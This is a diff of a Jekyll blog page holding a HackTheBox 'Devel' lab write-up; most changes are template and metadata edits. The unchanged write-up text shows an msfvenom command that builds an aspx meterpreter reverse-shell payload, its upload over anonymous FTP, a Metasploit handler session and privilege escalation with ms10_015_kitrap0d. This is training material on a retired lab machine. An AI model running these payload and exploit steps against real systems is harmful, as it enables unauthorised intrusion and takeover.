@@ -13,9 +13,9 @@
 <meta name="description" content="Devel is a retired Windows machine that is rated as Easy on Hack the Box. It is a beginner-level machine which can be completed using publicly available exploits..">
 
 
-  <meta name="author" content="Your Name">
+  <meta name="author" content="DcodeZer0">
   
-  <meta property="article:author" content="Your Name">
+  <meta property="article:author" content="DcodeZer0">
   
 
 
@@ -23,16 +23,28 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="Dcodezero">
 <meta property="og:title" content="HackTheBox Devel">
-<meta property="og:url" content="https://dcodezero.github.io//hackthebox/Devel/">
+<meta property="og:url" content="http://0.0.0.0:4000/hackthebox/Devel/">
 
 
   <meta property="og:description" content="Devel is a retired Windows machine that is rated as Easy on Hack the Box. It is a beginner-level machine which can be completed using publicly available exploits..">
 
 
 
-  <meta property="og:image" content="https://dcodezero.github.io//assets/img/sample/devel.png">
+  <meta property="og:image" content="http://0.0.0.0:4000/assets/img/sample/devel.png">
 
 
+
+  <meta name="twitter:site" content="@Dcodezer0">
+  <meta name="twitter:title" content="HackTheBox Devel">
+  <meta name="twitter:description" content="Devel is a retired Windows machine that is rated as Easy on Hack the Box. It is a beginner-level machine which can be completed using publicly available exploits..">
+  <meta name="twitter:url" content="http://0.0.0.0:4000/hackthebox/Devel/">
+
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="http://0.0.0.0:4000/assets/img/sample/devel.png">
+  
+
+  
 
 
 
@@ -47,7 +59,7 @@
   
 
 
-<link rel="canonical" href="https://dcodezero.github.io//hackthebox/Devel/">
+<link rel="canonical" href="http://0.0.0.0:4000/hackthebox/Devel/">
 
 
 
@@ -93,7 +105,7 @@ document.addEventListener("DOMContentLoaded", function() {
 </script><meta name="viewport" content="width=device-width, initial-scale=1.0">
 <script>
 document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
- 
+ window.enable_copy_code_button = true;
 </script>
 <!-- For all browsers -->
 <link rel="stylesheet" href="/assets/css/main.css">
@@ -124,6 +136,8 @@ document.documentElement.className = document.documentElement.className.replace(
   <div class="masthead__inner-wrap">
     <div class="masthead__menu">
       <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/brew.webp" alt="Dcodezero"></a>
         
         <a class="site-title" href="/">
           Dcodezero
@@ -160,6 +174,11 @@ document.documentElement.className = document.documentElement.className.replace(
                 
               >Tools</a>
             </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
         
         <button class="greedy-nav__toggle hidden" type="button">
           <span class="visually-hidden">Toggle menu</span>
@@ -201,8 +220,15 @@ document.documentElement.className = document.documentElement.className.replace(
 
   <p class="page__meta">
     
-
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2020-03-12T00:00:00+00:00">March 12, 2020</time>
+      </span>
     
+
+    <span class="page__meta-sep"></span>
 
     
       
@@ -211,7 +237,7 @@ document.documentElement.className = document.documentElement.className.replace(
       <span class="page__meta-readtime">
         <i class="far fa-clock" aria-hidden="true"></i>
         
-          3 minute read
+          4 minute read
         
       </span>
     
@@ -229,6 +255,43 @@ document.documentElement.className = document.documentElement.className.replace(
 
 
 
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/" itemprop="item"><span itemprop="name">Home</span></a>
+
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#hackthebox" itemprop="item"><span itemprop="name">Hackthebox</span></a>
+          <meta itemprop="position" content="2" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">HackTheBox Devel</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
 
 <div id="main" role="main">
   
@@ -239,14 +302,21 @@ document.documentElement.className = document.documentElement.className.replace(
 <div itemscope itemtype="https://schema.org/Person" class="h-card">
 
   
+    <div class="author__avatar">
+      <a href="/">
+        <img src="/assets/images/brew.webp" alt="DcodeZer0" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
 
   <div class="author__content">
     <h3 class="author__name p-name" itemprop="name">
-      <a class="u-url" rel="me" href="/" itemprop="url">Your Name</a>
+      <a class="u-url" rel="me" href="/" itemprop="url">DcodeZer0</a>
     </h3>
     
       <div class="author__bio p-note" itemprop="description">
-        <p>I am an <strong>amazing</strong> person.</p>
+        <p>┌──[root@dcodezero]
+└──╼ # Hacker | RedTeam | PenTester | CTFPlayer | HackTheBox</p>
 
       </div>
     
@@ -264,21 +334,28 @@ document.documentElement.className = document.documentElement.className.replace(
       
         
           
-        
+            <li><a href="https://twitter.com/Dcodezer0" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
           
         
           
-        
+            <li><a href="https://github.com/DcodeZero" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
           
         
           
-        
+            <li><a href="https://app.hackthebox.com/profile/291968" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fa-solid fa-cube" aria-hidden="true"></i><span class="label">Hackthebox</span></a></li>
           
         
       
 
       
 
+      
+        <li>
+          <a href="mailto:dcodezero@proton.me" rel="me" class="u-email">
+            <meta itemprop="email" content="dcodezero@proton.me" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
       
 
       
@@ -385,7 +462,7 @@ document.documentElement.className = document.documentElement.className.replace(
         Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
 </code></pre></div></div>
 
-<p>From the results of <code>NMAP</code> we can see that port <code>21</code> and <code>80</code> are open. The <code>NMAP</code> also says that it’s a <code>ISS 7</code> server.
+<p>From the results of <code class="language-plaintext highlighter-rouge">NMAP</code> we can see that port <code class="language-plaintext highlighter-rouge">21</code> and <code class="language-plaintext highlighter-rouge">80</code> are open. The <code class="language-plaintext highlighter-rouge">NMAP</code> also says that it’s a <code class="language-plaintext highlighter-rouge">ISS 7</code> server.
 So here is the exploit plan, upload an .aspx through ftp, get the reverse shell and escalate the privilege.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ftp 10.10.10.5
@@ -406,7 +483,7 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
     226 Transfer complete.
 </code></pre></div></div>
 
-<h2 id="trying-to-upload-a-file-through-ftp">Trying to upload a file through <code>FTP</code></h2>
+<h2 id="trying-to-upload-a-file-through-ftp">Trying to upload a file through <code class="language-plaintext highlighter-rouge">FTP</code></h2>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ftp&gt; put test.html
     200 PORT command successful.
@@ -415,11 +492,11 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
     16 bytes sent in 0.000144 seconds (114 kbytes/s)
 </code></pre></div></div>
 
-<p>As we can see that <code>FTP</code> file trasfer is successful.</p>
+<p>As we can see that <code class="language-plaintext highlighter-rouge">FTP</code> file trasfer is successful.</p>
 
 <h2 id="generating-payload">Generating Payload</h2>
 
-<p>I’m using <code>msfvenom</code> to generate the reverse shell payload.</p>
+<p>I’m using <code class="language-plaintext highlighter-rouge">msfvenom</code> to generate the reverse shell payload.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=5566 -f aspx &gt; shell.aspx
 
@@ -430,7 +507,7 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
     Final size of aspx file: 2824 bytes
 </code></pre></div></div>
 
-<p>As the Payload has been successfully generated, It’s time to upload the file to the victim machine via <code>FTP</code>.</p>
+<p>As the Payload has been successfully generated, It’s time to upload the file to the victim machine via <code class="language-plaintext highlighter-rouge">FTP</code>.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ftp&gt; put shell.aspx
     200 PORT command successful.
@@ -474,7 +551,7 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
     0   Wildcard Target
 </code></pre></div></div>
 
-<p>Running the exploit command and opening the <code>shell.aspx</code> in the browser, gave me a meterpreter session</p>
+<p>Running the exploit command and opening the <code class="language-plaintext highlighter-rouge">shell.aspx</code> in the browser, gave me a meterpreter session</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    msf5 exploit(multi/handler) &gt; exploit
 
@@ -490,9 +567,9 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
 
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 
-<p>For this part we need a exploit suggester, so I went with a Exploit Suggester module <code>use post/multi/recon/local_exploit_suggester</code> from metasploit.</p>
+<p>For this part we need a exploit suggester, so I went with a Exploit Suggester module <code class="language-plaintext highlighter-rouge">use post/multi/recon/local_exploit_suggester</code> from metasploit.</p>
 
-<p>After the run of Exploit Suggester, I used  <code>exploit/windows/local/ms10_015_kitrap0d</code> for PE.</p>
+<p>After the run of Exploit Suggester, I used  <code class="language-plaintext highlighter-rouge">exploit/windows/local/ms10_015_kitrap0d</code> for PE.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    meterpreter &gt; background
     [*] Backgrounding session 1...
@@ -592,11 +669,11 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
       <section class="page__share">
   <h4 class="page__share-title">Share on</h4>
 
-  <a href="https://twitter.com/intent/tweet?text=HackTheBox+Devel%20%2Fhackthebox%2FDevel%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?via=Dcodezer0&text=HackTheBox+Devel%20%2Fhackthebox%2FDevel%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdcodezero.github.io%2F%2Fhackthebox%2FDevel%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fhackthebox%2FDevel%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://dcodezero.github.io//hackthebox/Devel/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://0.0.0.0:4000/hackthebox/Devel/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
@@ -646,17 +723,24 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
 
   <p class="page__meta">
     
-
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-01-06T00:00:00+00:00">January 6, 2026</time>
+      </span>
     
+
+    <span class="page__meta-sep"></span>
 
     
       
       
 
       <span class="page__meta-readtime">
-        <i class="far fa-clock" aria-hidden="true"></i>
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
         
-          18 minute read
+          24 minute read
         
       </span>
     
@@ -691,17 +775,24 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
 
   <p class="page__meta">
     
-
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-01-06T00:00:00+00:00">January 6, 2026</time>
+      </span>
     
+
+    <span class="page__meta-sep"></span>
 
     
       
       
 
       <span class="page__meta-readtime">
-        <i class="far fa-clock" aria-hidden="true"></i>
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
         
-          6 minute read
+          9 minute read
         
       </span>
     
@@ -736,17 +827,24 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
 
   <p class="page__meta">
     
-
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-01-05T00:00:00+00:00">January 5, 2026</time>
+      </span>
     
+
+    <span class="page__meta-sep"></span>
 
     
       
       
 
       <span class="page__meta-readtime">
-        <i class="far fa-clock" aria-hidden="true"></i>
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
         
-          6 minute read
+          9 minute read
         
       </span>
     
@@ -781,17 +879,24 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
 
   <p class="page__meta">
     
-
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2026-01-04T00:00:00+00:00">January 4, 2026</time>
+      </span>
     
+
+    <span class="page__meta-sep"></span>
 
     
       
       
 
       <span class="page__meta-readtime">
-        <i class="far fa-clock" aria-hidden="true"></i>
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
         
-          8 minute read
+          11 minute read
         
       </span>
     
@@ -814,6 +919,17 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
       
     </div>
 
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
     
  
   
@@ -899,7 +1015,7 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
 </div>
 
 
-<div class="page__footer-copyright">&copy; 2026 <a href="https://dcodezero.github.io/">Dcodezero</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div> 
+<div class="page__footer-copyright">&copy; 2026 <a href="https://dcodezero.github.io/">dcodezero</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div> 
 
       </footer>
     </div>
@@ -910,7 +1026,30 @@ So here is the exploit plan, upload an .aspx through ftp, get the reverse shell 
 
 
 
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
 
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/hackthebox/Devel/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/hackthebox/Devel"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://dcode_zero.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
 
 
 
